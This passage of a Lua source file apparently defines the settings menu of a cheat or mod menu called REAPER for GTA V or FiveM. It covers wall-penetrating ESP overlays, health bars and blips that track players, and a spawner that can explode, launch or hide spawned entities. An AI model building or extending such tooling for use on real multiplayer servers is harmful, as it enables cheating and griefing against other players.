            {text = 'Color type', dkey = 'visuals:boxesp_fcolortype', desc = 'Color type of the box esp fill.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Box fill color type', length = 10, tipus = 'betu', func = {'Static', 'Random', 'Rainbow'}},
            {text = 'Color', dkey = 'visuals:boxesp_fcolor', desc = 'Set the box esp fill color and alpha.\nFormat: r g b a.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Box fill color', length = 15, tipus = 'szin', menuextra = {r = 0, g = 0, b = 0, a = 0}, func = '0 0 0 0'},
            {text = 'Secondary color', dkey = 'visuals:boxesp_fsecondarycolor', desc = 'The secondary color type.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Secondary color type', length = 30, tipus = 'betu', toggle = false, func = {'Occluded', 'Targeting list'}},
            {text = 'Color type', dkey = 'visuals:boxesp_focolortype', desc = 'Color type of the secondary box fill.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Secondary box fill color type', length = 10, tipus = 'betu', func = {'Static', 'Random', 'Rainbow'}},
            {text = 'Color', dkey = 'visuals:boxesp_focolor', desc = 'Set the secondary box fill color and alpha.\nFormat: r g b a.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Secondary box fill color', length = 15, tipus = 'szin', menuextra = {r = 0, g = 0, b = 0, a = 0}, func = '0 0 0 0'},
        },

        ['visuals:baresp'] = {
            {text = 'Health bar', dkey = 'visuals:baresp_baresp', desc = 'Toggle the health bar. Visible through\neverything.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Target', dkey = 'visuals:baresp_target', desc = 'The targets the health bar should work\non.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Health bar target', length = 20, tipus = 'betu', func = {'Hover', 'Closest', 'Peds', 'Vehicles'}},
            {text = 'Distance', dkey = 'visuals:baresp_distance', desc = 'The distance within the health bar will\nbe visible.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Health bar distance number', length = 4, tipus = 'szam', toggle = false, func = __REAPER1__.T.Ezres},
            {text = 'Only players', dkey = 'visuals:baresp_onlyplayers', desc = 'Make the health bar only work with\nplayers.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Self', dkey = 'visuals:baresp_self', desc = 'Include yourself.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Only alive', dkey = 'visuals:baresp_onlyalive', desc = 'Make the health bar only work on alive\npeds/vehicles.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Text', dkey = 'visuals:baresp_text', desc = 'Display the health amount with text.\nOnly visible if health is below 100 or\nabove 0.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Position', dkey = 'visuals:baresp_position', desc = 'The position of the health bar.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Health bar position', length = 30, tipus = 'betu', func = {'Vertical left', 'Vertical right', 'Horizontal top', 'Horizontal bottom'}},
            {text = 'Thickness', dkey = 'visuals:baresp_thickness', desc = 'The tickness of the health bar. 30 = 1\npixel. Works best with the value of 30.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Health bar thickness number', length = 3, tipus = 'szam', func = __REAPER1__.T.Szazas},
            {text = 'Background', dkey = 'visuals:baresp_background', desc = 'Toggle the background with a style.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Background styling', length = 30, tipus = 'betu', func = {'None', 'Normal', 'Thick'}},
            {text = 'Color type', dkey = 'visuals:baresp_colortype', desc = 'Color type of the health bar', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Health bar color type', length = 10, tipus = 'betu', func = {'Dynamic', 'Static', 'Random', 'Rainbow'}},
            {text = 'Color', dkey = 'visuals:baresp_color', desc = 'Set the health bar color and alpha.\nFormat: r g b a.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Health bar color', length = 15, tipus = 'szin', menuextra = {r = 0, g = 0, b = 0, a = 0}, func = '0 0 0 0'},
            {text = 'Secondary color', dkey = 'visuals:baresp_secondarycolor', desc = 'The secondary color type.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Secondary color type', length = 30, tipus = 'betu', toggle = false, func = {'Occluded', 'Targeting list'}},
            {text = 'Color type', dkey = 'visuals:baresp_ocolortype', desc = 'Color type of the secondary health bar.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Secondary health bar color type', length = 10, tipus = 'betu', func = {'Dynamic', 'Static', 'Random', 'Rainbow'}},
            {text = 'Color', dkey = 'visuals:baresp_ocolor', desc = 'Set the secondary health bar color and\nalpha. Format: r g b a.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Secondary health bar color', length = 15, tipus = 'szin', menuextra = {r = 0, g = 0, b = 0, a = 0}, func = '0 0 0 0'},
            {text = 'Armour bar', option = __REAPER1__.M.Separator},
            {text = 'Armour bar', dkey = 'visuals:baresp_fbaresp', desc = 'Toggle the armour bar. Visible through\neverything.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Target', dkey = 'visuals:baresp_ftarget', desc = 'The targets the armour bar should work\non.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Armour bar target', length = 20, tipus = 'betu', func = {'Hover', 'Closest', 'Peds'}},
            {text = 'Distance', dkey = 'visuals:baresp_fdistance', desc = 'The distance within the armour bar will\nbe visible.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Armour bar distance number', length = 4, tipus = 'szam', toggle = false, func = __REAPER1__.T.Ezres},
            {text = 'Only players', dkey = 'visuals:baresp_fonlyplayers', desc = 'Make the armour bar only work with\nplayers.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Self', dkey = 'visuals:baresp_fself', desc = 'Include yourself.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Only alive', dkey = 'visuals:baresp_fonlyalive', desc = 'Make the armour bar only work on alive\npeds/vehicles.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Text', dkey = 'visuals:baresp_ftext', desc = 'Display the armour amount with text.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Position', dkey = 'visuals:baresp_fposition', desc = 'The position of the armour bar.\nOnly visible if armour is below 100 or\nabove 0.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Armour bar position', length = 30, tipus = 'betu', func = {'Vertical left', 'Vertical right', 'Horizontal top', 'Horizontal bottom'}},
            {text = 'Thickness', dkey = 'visuals:baresp_fthickness', desc = 'The tickness of the armour bar 30 = 1\npixel. Works best with the value of 30.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Armour bar thickness number', length = 3, tipus = 'szam', func = __REAPER1__.T.Szazas},
            {text = 'Background', dkey = 'visuals:baresp_fbackground', desc = 'Toggle the background with a style.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Background styling', length = 30, tipus = 'betu', func = {'None', 'Normal', 'Thick'}},
            {text = 'Color type', dkey = 'visuals:baresp_fcolortype', desc = 'Color type of the armour bar', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Armour bar color type', length = 10, tipus = 'betu', func = {'Static', 'Random', 'Rainbow'}},
            {text = 'Color', dkey = 'visuals:baresp_fcolor', desc = 'Set the armour bar color and alpha.\nFormat: r g b a.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Armour bar color', length = 15, tipus = 'szin', menuextra = {r = 0, g = 0, b = 0, a = 0}, func = '0 0 0 0'},
            {text = 'Secondary color', dkey = 'visuals:baresp_fsecondarycolor', desc = 'The secondary color type.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Secondary color type', length = 30, tipus = 'betu', toggle = false, func = {'Occluded', 'Targeting list'}},
            {text = 'Color type', dkey = 'visuals:baresp_focolortype', desc = 'Color type of the secondary armour bar.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Secondary armour bar color type', length = 10, tipus = 'betu', func = {'Static', 'Random', 'Rainbow'}},
            {text = 'Color', dkey = 'visuals:baresp_focolor', desc = 'Set the secondary armour bar color and\nalpha. Format: r g b a.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Secondary armour bar color', length = 15, tipus = 'szin', menuextra = {r = 0, g = 0, b = 0, a = 0}, func = '0 0 0 0'},
        },

        ['visuals:fovarrows'] = {
            {text = 'Out of fov arrows', dkey = 'visuals:fovarrow_fovarrow', desc = 'Toggle the out of fov arrows.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Target', dkey = 'visuals:fovarrow_target', desc = 'The targets the fov arrows should work\non.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Fov arrows target', length = 20, tipus = 'betu', func = {'Closest', 'Peds', 'Vehicles', 'Objects'}},
            {text = 'Distance', dkey = 'visuals:fovarrow_distance', desc = 'The distance within the fov arrows\nshould work.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Fov arrows distance number', length = 4, tipus = 'szam', toggle = false, func = __REAPER1__.T.Ezres},
            {text = 'Only players', dkey = 'visuals:fovarrow_onlyplayers', desc = 'Make the fov arrows work with only\nplayers.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Only alive', dkey = 'visuals:fovarrow_onlyalive', desc = 'Make the fov arrows only work on alive\npeds/vehicles.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Fov config', option = __REAPER1__.M.Separator},
            {text = 'Size', dkey = 'visuals:fovarrow_size', desc = 'Size of the fov.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Fov size number', length = 4, tipus = 'szam', func = __REAPER1__.T.Ezres},
            {text = 'Dynamic', dkey = 'visuals:fovarrow_dynamic', desc = 'Make the size be based on the distance.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Occluded', dkey = 'visuals:fovarrow_occluded', desc = 'If the target is occluded but in\nfov, it will get targeted too.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Arrow config', option = __REAPER1__.M.Separator},
            {text = 'Type', dkey = 'visuals:fovarrow_type', desc = 'Type of the fov arrow. Default only works\nwith game version: 2189 or higher.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Fov arrow type', length = 20, tipus = 'betu', func = {'Neon', 'Default', 'Normal', 'Normal 2', 'Long'}, extra = {{dict = 'helicopterhud', name = 'hudarrow', min = 270},{dict = 'mparcadecabinetgridhud', name = 'gang_lobby_player_highlight', min = 90},{dict = 'mpmanhuntvhsfont', name = 'mp_arrow', min = 90},{dict = 'hunting', name = 'huntingwindarrow_32', min = 270},{dict = 'mpturf', name = 'straight_ahead', min = 270}}},
            {text = 'Size', dkey = 'visuals:fovarrow_asize', desc = 'Size of the arrows.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Fov arrow size number', length = 3, tipus = 'szam', func = __REAPER1__.T.Szazas},
            {text = 'Dynamic alpha', dkey = 'visuals:fovarrow_dynamicalpha', desc = 'Have the alpha of the arrow based\non the distance.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Color type', dkey = 'visuals:fovarrow_colortype', desc = 'Color type of the fov arrow.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Fov arrow color type', length = 10, tipus = 'betu', func = {'Static', 'Random', 'Rainbow'}},
            {text = 'Color', dkey = 'visuals:fovarrow_color', desc = 'Set the fov arrow color and alpha.\nFormat: r g b a.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Fov arrow color', length = 15, tipus = 'szin', menuextra = {r = 0, g = 0, b = 0, a = 0}, func = '0 0 0 0'},
            {text = 'Secondary color', dkey = 'visuals:fovarrow_secondarycolor', desc = 'The secondary color type.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Secondary color type', length = 30, tipus = 'betu', toggle = false, func = {'Occluded', 'Targeting list'}},
            {text = 'Color type', dkey = 'visuals:fovarrow_ocolortype', desc = 'Secondary color type.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Secondary color type', length = 10, tipus = 'betu', func = {'Static', 'Random', 'Rainbow'}},
            {text = 'Color', dkey = 'visuals:fovarrow_ocolor', desc = 'Secondary color type for the fov arrow\ncolor. Format: r g b a.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Secondary color', length = 15, tipus = 'szin', menuextra = {r = 0, g = 0, b = 0, a = 0}, func = '0 0 0 0'},
        },

        ['visuals:glowing'] = {
            {text = 'Glow', dkey = 'visuals:glow_glow', desc = 'Toggle the glow. Can\'t be seen through\nwalls.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Target', dkey = 'visuals:glow_target', desc = 'The targets the glow should work on.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Glow target', length = 20, tipus = 'betu', func = {'Hover', 'Closest', 'Peds'}},
            {text = 'Distance', dkey = 'visuals:glow_distance', desc = 'The distance within the glowing will\nbe visible.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Glow distance number', length = 4, tipus = 'szam', toggle = false, func = __REAPER1__.T.Ezres},
            {text = 'Only players', dkey = 'visuals:glow_onlyplayers', desc = 'Make the glow only work with players.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Self', dkey = 'visuals:glow_self', desc = 'Include yourself.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Glow config', option = __REAPER1__.M.Separator},
            {text = 'Strength', dkey = 'visuals:glow_strength', desc = 'The glow strength.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Glow strength number', length = 5, tipus = 'szam', func = __REAPER1__.T.Tizezres},
            {text = 'Flashing', dkey = 'visuals:glow_flashing', desc = 'Make the glowing flash.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Color type', dkey = 'visuals:glow_colortype', desc = 'Color type of the glow.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Glow color type', length = 10, tipus = 'betu', func = {'Static', 'Random', 'Rainbow'}},
            {text = 'Color', dkey = 'visuals:glow_color', desc = 'Set the glow color and alpha.\nFormat: r g b.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Glow color', length = 15, tipus = 'szin', menuextra = {r = 0, g = 0, b = 0,}, func = '0 0 0'},
        },

        ['visuals:lineesp'] = {
            {text = 'Line esp', dkey = 'visuals:lineesp_lineesp', desc = 'Toggle the line esp. Visible through\nwalls.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Target', dkey = 'visuals:lineesp_target', desc = 'The targets the line esp should work on.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Line esp target', length = 20, tipus = 'betu', func = {'Hover', 'Closest', 'Peds', 'Vehicles', 'Objects'}},
            {text = 'Only players', dkey = 'visuals:lineesp_onlyplayers', desc = 'Make the line esp only work with players.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Distance', dkey = 'visuals:lineesp_distance', desc = 'The distance within the line esp will\nbe visible.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Line esp distance number', length = 4, tipus = 'szam', toggle = false, func = __REAPER1__.T.Ezres},
            {text = 'Only alive', dkey = 'visuals:lineesp_onlyalive', desc = 'Make the line esp only work on alive\npeds/vehicles.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Line esp config', option = __REAPER1__.M.Separator},
            {text = 'Offset', dkey = 'visuals:lineesp_offset', desc = 'The x y z offsets for the position of\nwhere the lines meet.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Offset coords', length = 30, tipus = 'coords', func = '0.0 0.0 0.0', extra = vector3(0.0, 0.0, 0.0)},
            {text = 'Color type', dkey = 'visuals:lineesp_colortype', desc = 'Color type of the line esp.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Line color type', length = 10, tipus = 'betu', func = {'Static', 'Random', 'Rainbow'}},
            {text = 'Color', dkey = 'visuals:lineesp_color', desc = 'Set the line esp color and alpha.\nFormat: r g b a.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Line color', length = 15, tipus = 'szin', menuextra = {r = 0, g = 0, b = 0, a = 0}, func = '0 0 0 0'},
            {text = 'Secondary color', dkey = 'visuals:lineesp_secondarycolor', desc = 'The secondary color type.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Secondary color type', length = 30, tipus = 'betu', toggle = false, func = {'Occluded', 'Targeting list'}},
            {text = 'Color type', dkey = 'visuals:lineesp_ocolortype', desc = 'Color type of the secondary line.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Secondary line color type', length = 10, tipus = 'betu', func = {'Static', 'Random', 'Rainbow'}},
            {text = 'Color', dkey = 'visuals:lineesp_ocolor', desc = 'Set the secondary line color and alpha.\nFormat: r g b a.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Secondary line color', length = 15, tipus = 'szin', menuextra = {r = 0, g = 0, b = 0, a = 0}, func = '0 0 0 0'},
        },

        ['visuals:markers'] = {
            {text = 'Markers', dkey = 'visuals:markers_markers', desc = 'Toggle the markers. Can\'t be seen through\nwalls.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Target', dkey = 'visuals:markers_target', desc = 'The targets the markers should work\non.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Marker target', length = 20, tipus = 'betu', func = {'Hover', 'Closest', 'Peds', 'Vehicles', 'Objects'}},
            {text = 'Only players', dkey = 'visuals:markers_onlyplayers', desc = 'Make the markers only work with players.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Self', dkey = 'visuals:markers_self', desc = 'Include yourself.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Distance', dkey = 'visuals:markers_distance', desc = 'The distance within the markers will be\nvisible.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Marker distance number', length = 4, tipus = 'szam', toggle = false, func = __REAPER1__.T.Ezres},
            {text = 'Only alive', dkey = 'visuals:markers_onlyalive', desc = 'Make the markers only work on alive\npeds/vehicles.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Markers config', option = __REAPER1__.M.Separator},
            {text = 'Type', dkey = 'visuals:markers_type', desc = 'The type of the marker.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Marker type', length = 2, tipus = 'szam', func = {0, 1 ,2 ,3 ,4 ,5 ,6 ,7 ,8 ,9 ,10 ,11 ,12 ,13 ,14 ,15 ,16 ,17 ,18 ,19 ,20 ,21 ,22 ,23 ,24 ,25 ,26 ,27 ,28 ,29 ,30 ,31 ,32 ,33 ,34 ,35 ,36 ,37 ,38 ,39 ,40 ,41 ,42 ,43}},
            {text = 'Offset', dkey = 'visuals:markers_offset', desc = 'The x y z offsets for the marker esp.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Offset coords', length = 30, tipus = 'coords', func = '0.0 0.0 0.0', extra = vector3(0.0, 0.0, 0.0)},
            {text = 'Direction', dkey = 'visuals:markers_direction', desc = 'The direction of the marker.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Marker direction', length = 20, tipus = 'coords', func = '0.0 0.0 0.0', extra = vector3(0.0, 0.0, 0.0)},
            {text = 'Rotation', dkey = 'visuals:markers_rotation', desc = 'The rotation of the marker.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Marker rotation', length = 20, tipus = 'coords', func = '0.0 0.0 0.0', extra = vector3(0.0, 0.0, 0.0)},
            {text = 'Scale', dkey = 'visuals:markers_scale', desc = 'The scale of the marker.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Marker scale', length = 3, tipus = 'szam', func = __REAPER1__.T.Szazas},
            {text = 'Rotate', dkey = 'visuals:markers_rotate', desc = 'Enable so the marker will rotate.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Move', dkey = 'visuals:markers_move', desc = 'Enable so the marker will move up and\ndown.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Face camera', dkey = 'visuals:markers_facecamera', desc = 'Enable so the marker will always face\nyour camera.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Draw on entity', dkey = 'visuals:markers_drawonentity', desc = 'Draw only on entities.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Color type', dkey = 'visuals:markers_colortype', desc = 'Color type of the markers.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Marker color type', length = 10, tipus = 'betu', func = {'Static', 'Random', 'Rainbow'}},
            {text = 'Color', dkey = 'visuals:markers_color', desc = 'Set the marker color and alpha.\nFormat: r g b a.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Marker color', length = 15, tipus = 'szin', menuextra = {r = 0, g = 0, b = 0, a = 0}, func = '0 0 0 0'},
        },

        ['visuals:blips'] = {
            {text = 'Blips', dkey = 'visuals:blips_blips', desc = 'Toggle the blips.', afu = __REAPER1__.M.visuals.blips.refresh, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Target', dkey = 'visuals:blips_target', desc = 'The targets the blips should work on.', afu = __REAPER1__.M.visuals.blips.refresh, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Blip target', length = 20, tipus = 'betu', func = {'Peds', 'Vehicles', 'Objects'}},
            {text = 'Only players', dkey = 'visuals:blips_onlyplayers', desc = 'Make the blips only work with players.', afu = __REAPER1__.M.visuals.blips.refresh, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Self', dkey = 'visuals:blips_self', desc = 'Include yourself.', afu = __REAPER1__.M.visuals.blips.refresh, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Distance', dkey = 'visuals:blips_distance', desc = 'The distance within the blips will be\nvisible on your mininap.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Blip distance number', length = 4, tipus = 'szam', toggle = false, func = __REAPER1__.T.Ezres},
            {text = 'Only alive', dkey = 'visuals:blips_onlyalive', desc = 'Make the blips only work on alive\npeds/vehicles.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Blips config', option = __REAPER1__.M.Separator},
            {text = 'Type', dkey = 'visuals:blips_type', desc = 'The type of the blips.', afu = __REAPER1__.M.visuals.blips.refresh, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Blip type number', length = 3, tipus = 'szam', func = __REAPER1__.T.BlipTypes},
            {text = 'Scale', dkey = 'visuals:blips_scale', desc = 'The scale of the blips.', afu = __REAPER1__.M.visuals.blips.refresh, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Blip scale number', length = 3, tipus = 'szam', func = __REAPER1__.T.Szazas},
            {text = 'Flash', dkey = 'visuals:blips_flash', desc = 'Enable so the blips will flash.', afu = __REAPER1__.M.visuals.blips.refresh, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Alpha', dkey = 'visuals:blips_alpha', desc = 'The alpha of the blips.', afu = __REAPER1__.M.visuals.blips.refresh, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Blip alpha number', length = 3, tipus = 'szam', func = __REAPER1__.T.Alpha},
            {text = 'Color', dkey = 'visuals:blips_color', desc = 'Color type of the blips.', afu = __REAPER1__.M.visuals.blips.refresh, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Blip color number', length = 2, tipus = 'szam', func = __REAPER1__.T.BlipColor},
            {text = 'Occluded', dkey = 'visuals:blips_occluded', desc = 'Draw the blips when occluded.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Occluded color', dkey = 'visuals:blips_ocolor', desc = 'Color type of the occluded blips.', afu = __REAPER1__.M.visuals.blips.refresh, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Occluded blip color number', length = 2, tipus = 'szam', toggle = false, func = __REAPER1__.T.BlipColor},
        },

        ['spawning'] = {
            {text = 'Obcject spawner', dkey = 'spawning:objectspawner', desc = 'Object spawner menu.', option = __REAPER1__.M.Menu_Button, func = {'spawning', 'spawning:objectspawner'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Ped spawner', dkey = 'spawning:pedspawner', desc = 'Ped spawner menu.', option = __REAPER1__.M.Menu_Button, func = {'spawning', 'spawning:pedspawner'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Vehicle spawner', dkey = 'spawning:vehiclespawner', desc = 'Vehicle spawner menu.', option = __REAPER1__.M.Menu_Button, func = {'spawning', 'spawning:vehiclespawner'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Existing Spawns', option = __REAPER1__.M.Separator},
            {text = 'Delete', dkey = 'spawning_delete', desc = 'Delete every spawned entity.', afu = __REAPER1__.M.spawning.delete, option = __REAPER1__.M.Button},
            {text = 'Bring', dkey = 'spawning_bring', desc = 'Bring every spawned entity.', afu = __REAPER1__.M.spawning.bring, option = __REAPER1__.M.Button},
            {text = 'Go to last', dkey = 'spawning_gotolast', desc = 'Go to the last spawned entity in the\nselected category.', afu = __REAPER1__.M.spawning.gotolast, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Spawn category', length = 20, tipus = 'betu', func = {'Object', 'Pedestrian', 'Vehicle'}},
            {text = 'Explode', dkey = 'spawning_explode', desc = 'Explode every spawned entity.', afu = __REAPER1__.M.spawning.explode, option = __REAPER1__.M.Button},
            {text = 'Launch', dkey = 'spawning_launch', desc = 'Launch every spawned entity.', afu = __REAPER1__.M.spawning.launch, option = __REAPER1__.M.Button},
            {text = 'Toggle god', dkey = 'spawning_togglegod', desc = 'Toggle the god mode of every spawned\nentity.', afu = __REAPER1__.M.spawning.togglegod, option = __REAPER1__.M.Button},
            {text = 'Toggle visibility', dkey = 'spawning_togglevisibility', desc = 'Toggle the visibility of every spawned\nentity.', afu = __REAPER1__.M.spawning.togglevis, option = __REAPER1__.M.Button},
            {text = 'Freeze', dkey = 'spawning_togglevisibility', desc = 'Freeze every spawned entity.', afu = __REAPER1__.M.spawning.freeze, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Blip', option = __REAPER1__.M.Separator},
            {text = 'Enable blips', dkey = 'spawning_enableblips', desc = 'Enable a blip on every spawned entity.', afu = __REAPER1__.M.spawning.blip, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Type', dkey = 'spawning_btype', desc = 'Select the blip type to play on every\nspawned entity.', afu = __REAPER1__.M.spawning.refreshblip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Blip type number', length = 3, tipus = 'szam', func = __REAPER1__.T.BlipTypes},
            {text = 'Scale', dkey = 'spawning_bscale', desc = 'The scale of the blip.', afu = __REAPER1__.M.spawning.refreshblip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Blip scale number', length = 3, tipus = 'szam', func = __REAPER1__.T.Szazas},
            {text = 'Color', dkey = 'spawning_color', desc = 'The color of the blip.', afu = __REAPER1__.M.spawning.refreshblip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Blip color number', length = 3, tipus = 'szam', func = __REAPER1__.T.BlipColor},
            {text = 'Alpha', dkey = 'spawning_alpha', desc = 'The alpha of the blip.', afu = __REAPER1__.M.spawning.refreshblip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Blip alpha number', length = 3, tipus = 'szam', func = __REAPER1__.T.Alpha},
            {text = 'Particle', option = __REAPER1__.M.Separator},
            {text = 'Play particle', dkey = 'spawning_playparticle', desc = 'Play a particle on every spawned entity.', afu = __REAPER1__.M.spawning.particle, option = __REAPER1__.M.Button},
            {text = 'Loop particle', dkey = 'spawning_loopparticle', desc = 'Loop particle on every spawned entity.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Type', dkey = 'spawning_type', desc = 'Select the particle type to play on every\nspawned entity.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Particle name', length = 50, tipus = 'vegyes', func = __REAPER1__.T.MParticles},
            {text = 'Scale', dkey = 'spawning_scale', desc = 'The scale of the particle.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Particle scale number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
        },

        ['spawning:objectspawner'] = {
            {text = 'Custom', dkey = 'spawning:objectspawner_custom', desc = 'Enter an object name to spawn.', afu = __REAPER1__.M.spawning.objectspawner.spawn, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Object name', length = 50, tipus = 'vegyes', func = 'None'},
            {text = 'Object', dkey = 'spawning:objectspawner_object', desc = 'Spawn a picked object.', afu = __REAPER1__.M.spawning.objectspawner.spawn, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Object name', length = 50, tipus = 'vegyes', func = {'Yacht','Towercrane','Alien egg','Ufo 1','Ufo 2','Pierro wheel','Blackhole','Fruitstand','Security hut','Ped_gib','Parachute','Head','Turret','Explosive barrel','Storage tank 1','Storage tank 2','Windmill 1','Windmill 2','Ball 1','Table','Pipes','Gravetomb','Boat','Gas tank','Container','Tree 1','Hoist','Radar','Gate','Rock','Ramp 1','Ball 2','Landing zone','Ball 3','Tube 1','Tube 2','Boost tube','Dummy plane','Track 1','Track 2','Beach fire','Tree 2','Fire 1','Fire 2','Ramp 2','Skate pipe','Stunt ramp','Boost track','Clock','Barrier','Busstop','Parking wand','Dildo','Water balge'}},
